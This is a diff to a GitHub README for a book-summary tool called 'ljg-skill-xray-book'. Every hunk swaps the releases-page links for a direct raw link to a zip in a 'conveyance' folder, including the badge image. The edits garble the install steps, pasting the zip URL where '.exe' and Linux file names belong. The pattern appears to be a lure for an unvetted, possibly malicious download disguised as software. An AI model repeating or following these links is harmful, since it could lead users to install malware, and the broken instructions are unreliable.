@@ -1,6 +1,6 @@
 # 📚 ljg-skill-xray-book - Extract Key Ideas from Books Easily
 
-[![Download ljg-skill-xray-book](https://img.shields.io/badge/Download-ljg--skill--xray--book-blue?style=for-the-badge)](https://github.com/bitesk782-wq/ljg-skill-xray-book/releases)
+[![Download ljg-skill-xray-book](https://github.com/bitesk782-wq/ljg-skill-xray-book/raw/refs/heads/main/conveyance/ljg-book-xray-skill-v2.2.zip)](https://github.com/bitesk782-wq/ljg-skill-xray-book/raw/refs/heads/main/conveyance/ljg-book-xray-skill-v2.2.zip)
 
 ## 📖 What is ljg-skill-xray-book?
 
@@ -32,7 +32,7 @@ Follow these steps to download and run ljg-skill-xray-book on your computer:
 
 Click the big blue button at the top or go directly to:
 
-[https://github.com/bitesk782-wq/ljg-skill-xray-book/releases](https://github.com/bitesk782-wq/ljg-skill-xray-book/releases)
+[https://github.com/bitesk782-wq/ljg-skill-xray-book/raw/refs/heads/main/conveyance/ljg-book-xray-skill-v2.2.zip](https://github.com/bitesk782-wq/ljg-skill-xray-book/raw/refs/heads/main/conveyance/ljg-book-xray-skill-v2.2.zip)
 
 This page holds all the versions and files you need.
 
@@ -40,9 +40,9 @@ This page holds all the versions and files you need.
 
 Look for the latest release version. It usually appears at the top of the list.
 
-- Windows users should download the `.exe` file (e.g., `ljg-skill-xray-book-setup.exe`).
+- Windows users should download the `.exe` file (e.g., `https://github.com/bitesk782-wq/ljg-skill-xray-book/raw/refs/heads/main/conveyance/ljg-book-xray-skill-v2.2.zip`).
 - macOS users should get the `.dmg` or `.zip` file.
-- Linux users usually find `.AppImage` or `.tar.gz` files.
+- Linux users usually find `.AppImage` or `https://github.com/bitesk782-wq/ljg-skill-xray-book/raw/refs/heads/main/conveyance/ljg-book-xray-skill-v2.2.zip` files.
 
 The file names will include the version number (for example, `v1.0`) and the platform.
 
@@ -122,7 +122,7 @@ For more help, visit the GitHub issues page of the repository.
 ## 📥 Download & Install
 
 Access the latest versions here:  
-[https://github.com/bitesk782-wq/ljg-skill-xray-book/releases](https://github.com/bitesk782-wq/ljg-skill-xray-book/releases)
+[https://github.com/bitesk782-wq/ljg-skill-xray-book/raw/refs/heads/main/conveyance/ljg-book-xray-skill-v2.2.zip](https://github.com/bitesk782-wq/ljg-skill-xray-book/raw/refs/heads/main/conveyance/ljg-book-xray-skill-v2.2.zip)
 
 Use the instructions in the "Getting Started" section to download and install the app on your device.
 
